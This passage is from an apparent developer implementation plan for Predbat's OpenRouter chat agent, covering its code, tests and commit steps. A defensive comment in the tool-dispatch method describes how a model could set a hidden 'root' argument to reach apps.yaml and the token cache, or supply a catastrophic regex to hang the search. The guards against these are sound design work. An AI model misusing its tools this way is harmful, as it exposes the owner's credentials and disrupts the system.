- [ ] **Step 5: Write `chat.py`**

Create `apps/predbat/chat.py` with the house header and:

```python
"""The Predbat AI chat agent component.

Presents Predbat's tools directly to an OpenRouter-served model as function-calling tools and
runs the agentic loop. Deliberately holds no loop-bound state: the turn itself runs on whichever
event loop invoked it, which in practice is the web component's, while this component's own
thread only flushes and prunes. See spec section 3.
"""

import asyncio
import threading
import time
from datetime import datetime

from component_base import ComponentBase
from chat_store import ConversationStore
from chat_tools import DEFAULT_FETCH_ALLOWLIST

EVENT_BUFFER_MAX = 2000

PRIMER = """You are an assistant built into Predbat, a home battery optimisation system that plans when to charge and discharge a household battery based on electricity rates, solar forecasts and historical load. The person you are talking to owns this system and is looking at its web interface.

Answer concisely and quote the user's real values rather than generalities. Call a tool rather than guessing: the tools read this specific installation. Use search_docs for questions about how to configure Predbat, and search_source then read_source for questions about what the code actually does - the source you can read is the exact version running here. Never invent an entity name; look it up with get_entities or get_config."""


class ChatBusyError(RuntimeError):
    """Raised when a turn is requested while another is already running."""


class AgentNotReadyError(RuntimeError):
    """Raised when work is handed to the component before its event loop exists."""


def build_snapshot(base):
    """Render a compact description of the live system for the system prompt.

    Rebuilt every turn from base state rather than stored with the conversation, so a restored
    conversation is never anchored to a stale picture. Everything deeper than this stays behind a
    tool call, which is what keeps the per-turn cost bounded.
    """

    def arg(name, default=None):
        """Read one Predbat argument, tolerating a base that has not finished starting."""
        try:
            return base.get_arg(name, default)
        except Exception:
            return default

    def state(name, default=None):
        """Read one attribute off the base instance."""
        return getattr(base, name, default)

    lines = ["Current Predbat state:"]
    lines.append("- Time now: {}".format(state("now_utc", datetime.now())))
    lines.append("- Predbat version: {}".format(state("this_version", "unknown")))
    lines.append("- Status: {}".format(state("current_status", "unknown")))
    lines.append("- Mode: {}".format(arg("mode", "unknown")))
    lines.append("- SOC: {} kWh of {} kWh, reserve {}".format(state("soc_kw", "unknown"), state("soc_max", "unknown"), state("reserve", "unknown")))
    lines.append("- Inverters: {} of type {}".format(state("num_inverters", "unknown"), arg("inverter_type", "unknown")))
    lines.append("- Cars configured: {}".format(state("num_cars", 0)))
    lines.append("- Currency: {}".format(state("currency_symbols", ["p", "£"])))
    lines.append("- Errors seen this run: {}".format(bool(state("had_errors", False))))

    rate_import = state("rate_import", {}) or {}
    rate_export = state("rate_export", {}) or {}
    minutes_now = state("minutes_now", 0) or 0
    if rate_import:
        lines.append("- Import rate now: {}".format(rate_import.get(minutes_now, "unknown")))
    if rate_export:
        lines.append("- Export rate now: {}".format(rate_export.get(minutes_now, "unknown")))

    windows = state("charge_window_best", []) or []
    if windows:
        lines.append("- Next planned charge window: {}".format(windows[0]))
    exports = state("export_window_best", []) or []
    if exports:
        lines.append("- Next planned export window: {}".format(exports[0]))

    return "\n".join(lines)


class ChatAgent(ComponentBase):
    """Runs the OpenRouter-backed chat agent for the Predbat web interface."""

    def initialize(self, api_key, model, base_url="https://openrouter.ai/api/v1", max_tokens=0, max_tool_calls=8, max_history=40, max_conversations=20, expiry_days=30, turn_timeout=180, fetch_allowlist=None):
        """Store configuration and build the conversation store and event buffer."""
        self.api_key = api_key
        self.default_model = model
        self.base_url = str(base_url or "https://openrouter.ai/api/v1").rstrip("/")
        self.max_tokens = max_tokens or 0
        self.max_tool_calls = max_tool_calls or 8
        self.max_history = max_history or 40
        self.turn_timeout = turn_timeout or 180
        self.fetch_allowlist = list(fetch_allowlist) if fetch_allowlist else list(DEFAULT_FETCH_ALLOWLIST)
        self.lock = threading.Lock()
        # Set on the first run() tick, from inside this component's own thread. Everything the
        # web layer hands over is scheduled onto it; until it exists, the component is still
        # starting and handlers answer 503.
        self.loop = None
        self.events = []
        self.event_seq = 0
        self.event_base = 0
        self.active = None
        self.pending_confirm = {}
        self.warned_web_search_base_url = False
        self.store = ConversationStore(self.storage, self.log, max_history=self.max_history, max_conversations=max_conversations or 20, expiry_days=expiry_days or 30)
        self.index_loaded = False
        self.turn_counter = 0

    def emit(self, conversation_id, event_type, data=None):
        """Append an event to the buffer and return its sequence number.

        A conversation_id of None marks a global event - busy, idle and reload - which every
        browser receives whatever conversation it is currently looking at.
        """
        with self.lock:
            self.event_seq += 1
            event = {"seq": self.event_seq, "conversation_id": conversation_id, "type": event_type, "data": data or {}}
            self.events.append(event)
            while len(self.events) > EVENT_BUFFER_MAX:
                self.events.pop(0)
                self.event_base += 1
            return self.event_seq

    def events_since(self, cursor, conversation_id):
        """Return events after cursor for one conversation, plus the new cursor and reload flag.

        Cursor replay rather than a live queue is what lets two browsers follow the same turn and
        a mid-turn reload resume: the buffer is the single source and each reader keeps a position.
        """
        with self.lock:
            cursor = int(cursor or 0)
            reload_needed = bool(self.events) and cursor < self.event_base
            selected = [event for event in self.events if event["seq"] > cursor and event["conversation_id"] in (None, conversation_id)]
            return selected, self.event_seq, reload_needed

    async def run_on_agent_loop(self, coro):
        """Await a coroutine on this component's own loop, from another thread's loop.

        run_coroutine_threadsafe schedules the work on the component loop and hands back a
        concurrent Future; wrap_future turns that into something the *calling* loop can await.
        The web loop therefore yields rather than blocking, and the work runs where it belongs.
        """
        loop = self.loop
        if loop is None:
            coro.close()
            raise AgentNotReadyError("The chat component has not finished starting")
        return await asyncio.wrap_future(asyncio.run_coroutine_threadsafe(coro, loop))

    async def run(self, seconds, first):
        """Record this component's loop, load the index, then flush and stay healthy.

        No network call happens here. Validating credentials at startup would let a slow or
        unreachable OpenRouter block Predbat's boot inside wait_api_started() for ten minutes.
        """
        if self.loop is None:
            self.loop = asyncio.get_running_loop()
        if not self.index_loaded:
            try:
                await self.store.load_index()
            except Exception as error:
                self.log("Warn: chat agent could not load its conversation index: {}".format(error))
            self.index_loaded = True
        else:
            try:
                await self.store.flush()
            except Exception as error:
                self.log("Warn: chat agent could not flush conversations: {}".format(error))
                self.count_errors += 1
        self._release_stale_turn()
        self.update_success_timestamp()
        return True

    def _release_stale_turn(self):
        """Clear a turn slot whose coroutine died without running its own cleanup.

        A turn scheduled on this loop is killed outright if the component is stopped or restarted
        mid-turn, because asyncio.run() closes the loop and the finally in _execute_turn never
        runs, leaving the composer locked in every browser until Predbat restarts.

        The test is elapsed wall-clock against the turn's own deadline, NOT a count of quiet
        ticks. A turn emits one busy event and can then legitimately produce nothing for a minute
        or more while the model thinks, and the housekeeping tick only fires every 60 seconds
        (component_base.py) - so a two-tick rule frees the slot of a turn that is merely slow,
        somewhere between 60 and 120 seconds, entirely independent of turn_timeout. Waiting until
        the turn has outlived its own deadline plus a grace period means a live turn is never
        touched: by then _execute_turn has either finished or been killed.
        """
        with self.lock:
            active = self.active
            if active is None:
                return
            started = active.get("started")
            if started is None or time.monotonic() - started < self.turn_timeout + STALE_TURN_GRACE_SECONDS:
                return
            turn_id = active.get("turn_id")
            self.active = None
        self.log("Warn: chat turn {} outlived its {}s timeout with no cleanup - releasing the turn slot".format(turn_id, self.turn_timeout))
        self.emit(None, "idle", {})
```

- [ ] **Step 6: Run the test to verify it passes**

```bash
cd /Users/treforsouthwell/predbat/batpred/coverage
./run_all --test chat > /tmp/chat_2.txt 2>&1; grep -iE "ERROR|traceback|failed|Result" /tmp/chat_2.txt | head -30
```

Expected: PASS.

- [ ] **Step 7: Verify the component gating end to end**

```bash
cd /Users/treforsouthwell/predbat/batpred/coverage
./run_all --quick > /tmp/chat_gating.txt 2>&1; grep -iE "AI Chat Agent|Skipping|^Result|failed" /tmp/chat_gating.txt | head -20
```

Expected: no `AI Chat Agent` initialisation line, because the test configuration sets neither `openrouter_api_key` nor `openrouter_model` — and no `Skipping` warning either, because that only fires when the component is *partly* configured. No test failures.

- [ ] **Step 8: Commit**

```bash
cd /Users/treforsouthwell/predbat/batpred
git add apps/predbat/chat.py apps/predbat/tests/test_chat.py apps/predbat/config.py apps/predbat/components.py apps/predbat/unit_test.py
./run_pre_commit
git add -A apps/predbat .cspell
git commit -m "feat(chat): add the AI chat agent component

Config, apps.yaml schema, the two switches, the live snapshot and the
cursor-replay event buffer. Gating falls out of the component registry:
required api_key and model mean the component is never constructed
without both, and a partly configured install already gets a targeted
warning naming the missing key.

run() does no network I/O, so an unreachable OpenRouter cannot block
Predbat's boot inside wait_api_started()."
```

---

## Task 7: The streaming agentic loop, tool dispatch and titles

**Files:**
- Modify: `apps/predbat/chat.py`
- Modify: `apps/predbat/tests/test_chat.py`

**Interfaces:**
- Consumes: everything from Task 6.
- Produces:
  - `async ChatAgent._stream_chunks(payload) -> async iterator of dict` — the only network call, replaced wholesale in tests.
  - `async ChatAgent._run_completion(conversation_id, messages, model) -> (message, usage, sources)`
  - `async ChatAgent._dispatch(conversation_id, name, arguments) -> dict`
  - `ChatAgent.build_messages(conversation_id, history) -> list`
  - `ChatAgent.claim_turn(conversation_id) -> int` — synchronous; raises `ChatBusyError` or `KeyError`
  - `ChatAgent.submit_turn(conversation_id, text) -> int` — synchronous, called from the web thread; schedules the turn on the component loop and returns at once
  - `async ChatAgent.run_turn(conversation_id, text) -> int` — claims and runs inline; used by tests and by anything already on the component loop
  - `async ChatAgent._execute_turn(conversation_id, turn_id, text)` — the turn body
  - `ChatAgent.tool_defs_by_name: dict[str, dict]`

- [ ] **Step 1: Write the failing tests**

Append to `apps/predbat/tests/test_chat.py`, adding `import json` and `from chat import ChatBusyError` plus `from chat_store import NEW_CONVERSATION_TITLE` to its imports:

```python
class FakeOpenRouter:
    """Replays canned chat-completion chunk sequences in place of the real endpoint."""

    def __init__(self, *responses):
        """Hold one chunk list per expected round trip."""
        self.responses = list(responses)
        self.payloads = []

    async def stream(self, payload):
        """Record the request payload and yield the next canned chunk list."""
        self.payloads.append(payload)
        chunks = self.responses.pop(0) if self.responses else [{"choices": [{"delta": {"content": "no more canned responses"}}]}]
        for chunk in chunks:
            yield chunk


def _text_response(text, usage=None):
    """Build a chunk list for a plain streamed answer."""
    chunks = [{"choices": [{"delta": {"content": piece}}]} for piece in text.split(" ")]
    chunks.append({"choices": [{"delta": {}, "finish_reason": "stop"}], "usage": usage or {"prompt_tokens": 10, "completion_tokens": 5, "cost": 0.0002}})
    return chunks


def _tool_call_response(name, arguments, call_id="call_1"):
    """Build a chunk list for a streamed tool call, fragmented the way providers send it."""
    encoded = json.dumps(arguments)
    half = len(encoded) // 2
    return [
        {"choices": [{"delta": {"tool_calls": [{"index": 0, "id": call_id, "type": "function", "function": {"name": name, "arguments": encoded[:half]}}]}}]},
        {"choices": [{"delta": {"tool_calls": [{"index": 0, "function": {"arguments": encoded[half:]}}]}}]},
        {"choices": [{"delta": {}, "finish_reason": "tool_calls"}], "usage": {"prompt_tokens": 20, "completion_tokens": 8, "cost": 0.0004}},
    ]


def _agent_with_fake(my_predbat, *responses, **overrides):
    """Build an agent whose only network call is replaced by a canned chunk replayer."""
    agent = _make_agent(my_predbat, **overrides)
    fake = FakeOpenRouter(*responses)
    agent._stream_chunks = fake.stream
    agent.fake = fake
    return agent


def test_plain_answer(my_predbat):
    """A turn with no tool call streams deltas, stores the answer, and reports usage."""
    failed = False
    print("**** Testing a plain chat turn ****")
    agent = _agent_with_fake(my_predbat, _text_response("your battery is charging because rates are low"))
    cid = asyncio.run(agent.store.create())

    asyncio.run(agent.run_turn(cid, "why is it charging?"))

    events, _, _ = agent.events_since(0, cid)
    kinds = [event["type"] for event in events]
    for required in ("user", "delta", "assistant", "usage", "done"):
        if required not in kinds:
            print("ERROR: turn did not emit {!r}, emitted {}".format(required, kinds))
            failed = True
    if "busy" not in [event["type"] for event in events] or "idle" not in [event["type"] for event in events]:
        print("ERROR: busy/idle were not both emitted: {}".format(kinds))
        failed = True

    messages = asyncio.run(agent.store.get_messages(cid))
    if not messages or messages[0]["role"] != "user" or messages[-1]["role"] != "assistant":
        print("ERROR: conversation did not record the exchange: {}".format(messages))
        failed = True
    if "charging" not in str(messages[-1].get("content")):
        print("ERROR: the assistant message lost its content: {}".format(messages[-1]))
        failed = True

    meta = agent.store.get_meta(cid)
    if not meta["usage_total"]["completion_tokens"]:
        print("ERROR: usage was not accumulated onto the conversation")
        failed = True
    if agent.active is not None:
        print("ERROR: the active turn was not released")
        failed = True

    return failed


def test_tool_call_round_trip(my_predbat):
    """A streamed tool call is reassembled, executed, and answered in a second round trip."""
    failed = False
    print("**** Testing a tool call turn ****")
    agent = _agent_with_fake(my_predbat, _tool_call_response("get_status", {}), _text_response("you are in Automatic mode"))
    cid = asyncio.run(agent.store.create())

    asyncio.run(agent.run_turn(cid, "what mode am I in?"))

    kinds = [event["type"] for event in agent.events_since(0, cid)[0]]
    for required in ("tool_start", "tool_end"):
        if required not in kinds:
            print("ERROR: the tool call was not reported: {}".format(kinds))
            failed = True

    messages = asyncio.run(agent.store.get_messages(cid))
    roles = [message["role"] for message in messages]
    if roles != ["user", "assistant", "tool", "assistant"]:
        print("ERROR: message roles were {}, expected a tool round trip".format(roles))
        failed = True
    tool_message = [message for message in messages if message["role"] == "tool"]
    if not tool_message or not tool_message[0].get("tool_call_id"):
        print("ERROR: the tool result is missing its tool_call_id, which the API rejects")
        failed = True

    if len(agent.fake.payloads) != 2:
        print("ERROR: expected two round trips, made {}".format(len(agent.fake.payloads)))
        failed = True
    else:
        tool_names = {tool["function"]["name"] for tool in agent.fake.payloads[0]["tools"]}
        for expected in ("get_plan", "search_docs", "read_source", "set_chat_title"):
            if expected not in tool_names:
                print("ERROR: {} was not offered to the model".format(expected))
                failed = True

    return failed


def test_tool_call_cap(my_predbat):
    """The loop stops at max_tool_calls and says so rather than spinning."""
    failed = False
    print("**** Testing the tool call cap ****")
    responses = [_tool_call_response("get_status", {}, call_id="call_{}".format(index)) for index in range(10)]
    agent = _agent_with_fake(my_predbat, *responses, max_tool_calls=2)
    cid = asyncio.run(agent.store.create())

    asyncio.run(agent.run_turn(cid, "loop please"))

    if len(agent.fake.payloads) > 3:
        print("ERROR: the loop made {} round trips with a cap of 2".format(len(agent.fake.payloads)))
        failed = True
    text = " ".join(str(event["data"].get("text", "")) for event in agent.events_since(0, cid)[0] if event["type"] == "assistant")
    if "limit" not in text.lower():
        print("ERROR: hitting the cap was not reported to the user: {!r}".format(text))
        failed = True
    if agent.active is not None:
        print("ERROR: the active turn was not released after hitting the cap")
        failed = True

    return failed


def test_tool_failures_are_results(my_predbat):
    """An unknown tool and malformed arguments come back to the model as tool results."""
    failed = False
    print("**** Testing tool failure handling ****")
    agent = _agent_with_fake(my_predbat, _tool_call_response("no_such_tool", {}), _text_response("sorry about that"))
    cid = asyncio.run(agent.store.create())
    asyncio.run(agent.run_turn(cid, "call something silly"))
    messages = asyncio.run(agent.store.get_messages(cid))
    tool_results = [message for message in messages if message["role"] == "tool"]
    if not tool_results or "Unknown tool" not in str(tool_results[0].get("content")):
        print("ERROR: an unknown tool did not come back as a tool result: {}".format(tool_results))
        failed = True

    broken = [
        {"choices": [{"delta": {"tool_calls": [{"index": 0, "id": "call_b", "type": "function", "function": {"name": "get_status", "arguments": "{not json"}}]}}]},
        {"choices": [{"delta": {}, "finish_reason": "tool_calls"}]},
    ]
    agent2 = _agent_with_fake(my_predbat, broken, _text_response("retrying"))
    cid2 = asyncio.run(agent2.store.create())
    asyncio.run(agent2.run_turn(cid2, "send bad json"))
    results2 = [message for message in asyncio.run(agent2.store.get_messages(cid2)) if message["role"] == "tool"]
    if not results2 or "argument" not in str(results2[0].get("content")).lower():
        print("ERROR: malformed tool arguments were not reported back: {}".format(results2))
        failed = True
    if agent2.active is not None:
        print("ERROR: a malformed tool call wedged the active turn")
        failed = True

    return failed


def test_titles(my_predbat):
    """The model titles the conversation, and the first message titles it when the model does not."""
    failed = False
    print("**** Testing conversation titles ****")
    agent = _agent_with_fake(my_predbat, _tool_call_response("set_chat_title", {"title": "Overnight charging"}), _text_response("here you go"))
    cid = asyncio.run(agent.store.create())
    asyncio.run(agent.run_turn(cid, "why charge overnight?"))
    if agent.store.get_meta(cid)["title"] != "Overnight charging":
        print("ERROR: set_chat_title did not take: {}".format(agent.store.get_meta(cid)["title"]))
        failed = True
    if "title" not in [event["type"] for event in agent.events_since(0, cid)[0]]:
        print("ERROR: the title change was not broadcast")
        failed = True

    quiet = _agent_with_fake(my_predbat, _text_response("no title for you"))
    cid2 = asyncio.run(quiet.store.create())
    asyncio.run(quiet.run_turn(cid2, "  what   is my export rate? "))
    title = quiet.store.get_meta(cid2)["title"]
    if title != "what is my export rate?":
        print("ERROR: the fallback title is {!r}, expected the collapsed first message".format(title))
        failed = True

    prompts = quiet.fake.payloads[0]["messages"][0]["content"]
    if "set_chat_title" not in prompts:
        print("ERROR: the title instruction was missing while the conversation was untitled")
        failed = True

    titled = _agent_with_fake(my_predbat, _text_response("second turn"))
    titled.store = quiet.store
    asyncio.run(titled.run_turn(cid2, "and my import rate?"))
    if "set_chat_title" in titled.fake.payloads[0]["messages"][0]["content"]:
        print("ERROR: the title instruction was still present after the conversation was titled")
        failed = True

    return failed


def test_busy_rejects_a_second_turn(my_predbat):
    """Only one turn runs at a time, and an unknown conversation is a KeyError not a crash."""
    failed = False
    print("**** Testing busy and unknown conversation handling ****")
    agent = _agent_with_fake(my_predbat, _text_response("hello"))
    cid = asyncio.run(agent.store.create())
    other = asyncio.run(agent.store.create())

    agent.active = {"conversation_id": cid, "turn_id": 1, "title": "busy"}
    try:
        asyncio.run(agent.run_turn(other, "me too"))
        print("ERROR: a second concurrent turn was accepted")
        failed = True
    except ChatBusyError:
        pass
    agent.active = None

    try:
        asyncio.run(agent.run_turn("ffffffffffffffff", "who?"))
        print("ERROR: an unknown conversation id was accepted")
        failed = True
    except KeyError:
        pass

    return failed
```

```python
def test_submit_turn_hands_off_to_the_component_loop(my_predbat):
    """submit_turn returns at once and the turn runs to completion on the component's own loop.

    This is the regression guard for the whole architecture: the web layer is a UI, so the call
    that starts a turn must not wait for it. A slow synchronous tool is used deliberately - if
    the work ever moves back onto the caller's loop, this test's timing assertion fails.
    """
    failed = False
    print("**** Testing the cross-thread turn handoff ****")
    import chat as chat_module

    def slow_search(*args, **kwargs):
        """Stand in for a slow synchronous full-tree scan."""
        time.sleep(0.4)
        return {"success": True, "error": None, "data": [], "total_matches": 0}

    agent = _agent_with_fake(my_predbat, _tool_call_response("search_source", {"pattern": "def "}), _text_response("found it"))

    loop = asyncio.new_event_loop()
    thread = threading.Thread(target=loop.run_forever, daemon=True)
    thread.start()
    agent.loop = loop
    original = chat_module.search_source
    chat_module.search_source = slow_search
    try:
        cid = asyncio.run_coroutine_threadsafe(agent.store.create(), loop).result(10)

        started = time.monotonic()
        turn_id = agent.submit_turn(cid, "search the source")
        elapsed = time.monotonic() - started
        if elapsed > 0.2:
            print("ERROR: submit_turn took {:.2f}s - it is waiting for the turn rather than handing it off".format(elapsed))
            failed = True
        if not turn_id:
            print("ERROR: submit_turn did not return a turn id")
            failed = True

        deadline = time.monotonic() + 15
        while agent.active is not None and time.monotonic() < deadline:
            time.sleep(0.05)
        if agent.active is not None:
            print("ERROR: the handed-off turn never completed or never released the turn slot")
            failed = True

        kinds = [event["type"] for event in agent.events_since(0, cid)[0]]
        for required in ("tool_start", "tool_end", "done"):
            if required not in kinds:
                print("ERROR: the turn did not run through on the component loop: {}".format(kinds))
                failed = True
                break
    finally:
        chat_module.search_source = original
        loop.call_soon_threadsafe(loop.stop)
        thread.join(timeout=5)
        loop.close()

    return failed


def test_submit_turn_needs_a_running_component(my_predbat):
    """Handing work over before the component loop exists is a clean error, not a hang."""
    failed = False
    print("**** Testing submit_turn before the component has started ****")
    agent = _agent_with_fake(my_predbat, _text_response("hello"))
    agent.loop = None
    cid = asyncio.run(agent.store.create())
    try:
        agent.submit_turn(cid, "too early")
        print("ERROR: submit_turn was accepted with no component loop")
        failed = True
    except chat.AgentNotReadyError:
        pass
    if agent.active is not None:
        print("ERROR: a refused submit_turn left the turn slot claimed")
        failed = True
    return failed
```

Add `import threading`, `import time` and `import chat` to the test file's imports. Extend the driver with `test_plain_answer`, `test_tool_call_round_trip`, `test_tool_call_cap`, `test_tool_failures_are_results`, `test_titles`, `test_busy_rejects_a_second_turn`, `test_submit_turn_hands_off_to_the_component_loop` and `test_submit_turn_needs_a_running_component`.

- [ ] **Step 2: Run the tests to verify they fail**

```bash
cd /Users/treforsouthwell/predbat/batpred/coverage
./run_all --test chat > /tmp/chat_3.txt 2>&1; grep -iE "AttributeError|ImportError|ERROR" /tmp/chat_3.txt | head -20
```

Expected: FAIL with `AttributeError: 'ChatAgent' object has no attribute 'run_turn'`.

- [ ] **Step 3: Implement the loop**

Add to the imports at the top of `apps/predbat/chat.py`:

```python
import aiohttp
import asyncio
import functools
import json
import time

from agent_tools import TOOL_DEFS, PredbatTools, openai_tool_list
from chat_store import NEW_CONVERSATION_TITLE, derive_title, trim_history
from chat_tools import CHAT_TOOL_DEFS, fetch_url, read_source, search_docs, search_source
```

In `initialize()`, after building the store, add:

```python
        self.tools = PredbatTools(self.base, log_func=self.log)
        self.tool_defs_by_name = {entry["name"]: entry for entry in list(TOOL_DEFS) + list(CHAT_TOOL_DEFS)}
```

Then append these methods to `ChatAgent`:

```python
    def build_messages(self, conversation_id, history):
        """Assemble the request messages: a freshly built system prompt plus trimmed history."""
        meta = self.store.get_meta(conversation_id) or {}
        parts = [PRIMER, "", build_snapshot(self.base)]
        if meta.get("title", NEW_CONVERSATION_TITLE) == NEW_CONVERSATION_TITLE:
            parts.append("")
            parts.append("This conversation has no title yet. Call set_chat_title once, early in your reply, with a short descriptive title of at most 60 characters summarising what the user is asking about.")
        return [{"role": "system", "content": "\n".join(parts)}] + trim_history(history, self.max_history, log=self.log)

    def tool_payload(self):
        """Return the tool list offered to the model: the shared tools plus the chat-only ones."""
        return openai_tool_list() + openai_tool_list(CHAT_TOOL_DEFS)

    async def _stream_chunks(self, payload):
        """Yield decoded chunk dicts from the chat-completions endpoint.

        The only network call in the component, and the seam the tests replace. The session is
        created per request because this coroutine runs on whichever event loop invoked the turn.
        """
        headers = {"Authorization": "Bearer {}".format(self.api_key), "Content-Type": "application/json", "HTTP-Referer": "https://springfall2008.github.io/batpred/", "X-Title": "Predbat"}
        timeout = aiohttp.ClientTimeout(total=self.turn_timeout)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.post("{}/chat/completions".format(self.base_url), headers=headers, json=payload) as response:
                if response.status != 200:
                    body = await response.text()
                    raise ChatRequestError(response.status, body)
                async for raw in response.content:
                    line = raw.decode("utf-8", errors="replace").strip()
                    if not line.startswith("data:"):
                        continue
                    data = line[len("data:") :].strip()
                    if not data or data == "[DONE]":
                        continue
                    try:
                        yield json.loads(data)
                    except ValueError:
                        continue

    async def _run_completion(self, conversation_id, messages, model):
        """Stream one completion, returning the assistant message, its usage and any sources."""
        payload = {"model": model, "messages": messages, "tools": self.tool_payload(), "stream": True, "usage": {"include": True}}
        if self.max_tokens:
            payload["max_tokens"] = self.max_tokens
        if self.web_search_enabled():
            payload["plugins"] = [{"id": "web"}]

        content = ""
        usage = {}
        sources = []
        accumulator = {}
        async for chunk in self._stream_chunks(payload):
            if chunk.get("usage"):
                usage = chunk["usage"]
            choices = chunk.get("choices") or []
            delta = (choices[0].get("delta") or {}) if choices else {}
            if delta.get("content"):
                content += delta["content"]
                self.emit(conversation_id, "delta", {"text": delta["content"]})
            for annotation in delta.get("annotations") or []:
                citation = annotation.get("url_citation") or {}
                if citation.get("url"):
                    sources.append({"url": citation["url"], "title": citation.get("title") or citation["url"]})
            # Tool call fragments are keyed by index, not id: the id and name arrive only in the
            # first fragment and the arguments are split across the rest.
            for fragment in delta.get("tool_calls") or []:
                slot = accumulator.setdefault(fragment.get("index", 0), {"id": None, "type": "function", "function": {"name": "", "arguments": ""}})
                if fragment.get("id"):
                    slot["id"] = fragment["id"]
                function = fragment.get("function") or {}
                if function.get("name"):
                    slot["function"]["name"] += function["name"]
                if function.get("arguments"):
                    slot["function"]["arguments"] += function["arguments"]

        message = {"role": "assistant", "content": content or None}
        if accumulator:
            message["tool_calls"] = [accumulator[index] for index in sorted(accumulator)]
        return message, usage, sources

    async def _dispatch(self, conversation_id, name, arguments):
        """Run one tool, trying the chat-only tools before the shared Predbat ones."""
        if name == "set_chat_title":
            title = self.store.set_title(conversation_id, arguments.get("title"))
            if title is None:
                return {"success": False, "error": "This conversation no longer exists", "data": None}
            self.titled_this_turn = True
            self.emit(conversation_id, "title", {"title": title})
            return {"success": True, "error": None, "data": {"title": title}}
        if name == "search_docs":
            return await search_docs(self.storage, arguments.get("query"), max_results=arguments.get("max_results", 5))
        # read_source is bounded work on this loop, which is fine: the component loop's only
        # other job is a five-second tick, and the web server is a different loop in a different
        # thread. search_source is different - it runs a MODEL-SUPPLIED regular expression, and
        # Python's re engine backtracks with no timeout, so a pattern like (.*)*x can hang inside
        # a single search() call that no elapsed-time check can interrupt. Run it on a worker
        # thread so a pathological pattern burns that thread rather than killing the component's
        # only event loop: the component stays alive, other turns still run, and this turn dies on
        # its own deadline. Containment, not latency.
        #
        # Never pass `root` to either function. It is deliberately absent from both tool schemas -
        # a model that could set it would point the search at /config and walk straight past the
        # extension allowlist that keeps apps.yaml and the token cache out.
        if name == "search_source":
            loop = asyncio.get_running_loop()
            return await loop.run_in_executor(None, functools.partial(search_source, arguments.get("pattern"), file=arguments.get("file"), max_results=arguments.get("max_results", 20)))
        if name == "read_source":
            return read_source(arguments.get("file"), start_line=arguments.get("start_line", 1), max_lines=arguments.get("max_lines", 200))
        if name == "fetch_url":
            return await fetch_url(arguments.get("url"), allowlist=self.fetch_allowlist)
        return await self.tools.execute(name, arguments)

    def claim_turn(self, conversation_id):
        """Reserve the single turn slot and return the new turn id.

        Synchronous and lock-guarded so the web thread can decide busy-or-not without waiting on
        either loop: by the time submit_turn returns, a concurrent send is already a clean 409.
        """
        meta = self.store.get_meta(conversation_id)
        if meta is None:
            raise KeyError("Unknown conversation {}".format(conversation_id))
        with self.lock:
            if self.active is not None:
                raise ChatBusyError("A reply is already in progress in '{}'".format(self.active.get("title")))
            self.turn_counter += 1
            turn_id = self.turn_counter
            # started is what _release_stale_turn measures against; without it a stranded slot is
            # never freed, and with a tick count instead it would free live ones.
            self.active = {"conversation_id": conversation_id, "turn_id": turn_id, "title": meta.get("title"), "started": time.monotonic()}
        return turn_id

    def submit_turn(self, conversation_id, text):
        """Start a turn on this component's loop and return its id without waiting for it.

        This is the web layer's entry point. The reply is delivered through the event buffer, so
        the HTTP request that started it has nothing left to wait for.
        """
        loop = self.loop
        if loop is None:
            raise AgentNotReadyError("The chat component has not finished starting")
        turn_id = self.claim_turn(conversation_id)
        asyncio.run_coroutine_threadsafe(self._execute_turn(conversation_id, turn_id, text), loop)
        return turn_id

    async def run_turn(self, conversation_id, text):
        """Claim and run a turn inline on the current loop, returning its id when it finishes."""
        turn_id = self.claim_turn(conversation_id)
        await self._execute_turn(conversation_id, turn_id, text)
        return turn_id

    async def _execute_turn(self, conversation_id, turn_id, text):
        """Run one full agentic turn, releasing the turn slot however it ends."""
        meta = self.store.get_meta(conversation_id) or {}
        self.titled_this_turn = False
        self.deadline = time.monotonic() + self.turn_timeout
        self.emit(None, "busy", {"conversation_id": conversation_id, "title": meta.get("title"), "turn_id": turn_id})
        try:
            await self.store.append(conversation_id, {"role": "user", "content": text})
            self.emit(conversation_id, "user", {"text": text})
            await self._turn_loop(conversation_id, turn_id, text)
        except ChatRequestError as error:
            self.count_errors += 1
            self.emit(conversation_id, "error", {"message": error.friendly()})
        except (aiohttp.ClientError, asyncio.TimeoutError) as error:
            self.count_errors += 1
            self.emit(conversation_id, "error", {"message": "Could not reach {}: {}".format(self.base_url, error)})
        except Exception as error:
            self.count_errors += 1
            self.log("Error: chat turn failed: {}".format(error))
            self.emit(conversation_id, "error", {"message": "The chat turn failed: {}".format(error)})
        finally:
            if not self.titled_this_turn and (self.store.get_meta(conversation_id) or {}).get("title") == NEW_CONVERSATION_TITLE:
                title = self.store.set_title(conversation_id, derive_title(text))
                if title:
                    self.emit(conversation_id, "title", {"title": title})
            try:
                await self.store.flush(conversation_id)
            except Exception as error:
                self.count_errors += 1
                self.log("Warn: could not persist chat conversation {}: {}".format(conversation_id, error))
            with self.lock:
                self.pending_confirm = {key: value for key, value in self.pending_confirm.items() if value.get("turn_id") != turn_id}
                # Only clear the slot if this turn still owns it. If _release_stale_turn already
                # freed it and another turn has since claimed it, an unconditional clear here
                # would silently unlock the composer while that turn is still running.
                if (self.active or {}).get("turn_id") == turn_id:
                    self.active = None
            self.emit(conversation_id, "done", {"turn_id": turn_id})
            self.emit(None, "idle", {})

    async def _turn_loop(self, conversation_id, turn_id, text):
        """Alternate completions and tool calls until the model answers or the cap is reached."""
        model = (self.store.get_meta(conversation_id) or {}).get("model") or self.default_model
        for iteration in range(self.max_tool_calls + 1):
            if time.monotonic() > self.deadline:
                self.emit(conversation_id, "error", {"message": "This turn took longer than {} seconds and was stopped".format(self.turn_timeout)})
                return
            history = await self.store.get_messages(conversation_id)
            message, usage, sources = await self._run_completion(conversation_id, self.build_messages(conversation_id, history), model)
            await self.store.append(conversation_id, message)
            if usage:
                self.store.add_usage(conversation_id, usage)
                total = (self.store.get_meta(conversation_id) or {}).get("usage_total", {})
                self.emit(conversation_id, "usage", {"prompt_tokens": usage.get("prompt_tokens", 0), "completion_tokens": usage.get("completion_tokens", 0), "cost": usage.get("cost", 0), "conversation_cost": total.get("cost", 0)})
            self.emit(conversation_id, "assistant", {"text": message.get("content") or "", "sources": sources})

            calls = message.get("tool_calls") or []
            if not calls:
                return
            if iteration >= self.max_tool_calls:
                # Answer the calls we are refusing to run. Leaving an assistant message that
                # carries tool_calls with no matching tool replies is exactly the shape
                # trim_history exists to avoid: the next turn sends the pair back, the API
                # rejects the whole request with a 400, and the conversation stays broken until
                # the pair ages out of the trim window. Deliberately no tool_start/tool_end
